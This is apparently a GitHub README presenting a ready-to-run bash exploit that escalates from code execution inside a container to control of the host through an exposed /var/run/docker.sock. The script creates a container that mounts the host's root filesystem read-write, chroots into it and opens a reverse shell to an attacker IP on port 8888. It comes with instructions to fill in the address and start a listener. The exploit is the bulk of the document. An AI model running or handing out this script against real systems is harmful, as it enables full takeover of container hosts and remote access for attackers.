# docker.sock environment takeover (Privilege Escalation)
![](https://github.com/Hritish42/docker.sock-environment-takeover/blob/main/Images/Docker.Socks.png?raw=true)

/var/run/docker.sock could lead to full environment takeover. (Privilege Escalation)

I've written a bash script to automate things written in this article. 

## Proof of Concept
To run this, you have to already have RCE on a container. Even with RCE, most of the time you will not have access to a docker client and installing a docker client might not be possible.

```bash
#!/bin/bash
pay="bash -c 'bash -i >& /dev/tcp/<Attacker-ipaddr>/8888 0>&1'"
payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$pay\\\"\"]"
response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
revShellContainerID=$(echo "$response" | cut -d'"' -f4)
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
sleep 1
curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"
````
- Add the attacker ip address to above bash script 
- Start a listener on attacker machine on port 8888. 
- Check the screenshots if you don't understand.

![](https://github.com/Hritish42/docker.sock-environment-takeover/blob/main/Images/poc1.png?raw=true)
![](https://github.com/Hritish42/docker.sock-environment-takeover/blob/main/Images/poc2.png?raw=true)


### References
https://dejandayoff.com/the-danger-of-exposing-docker.sock/
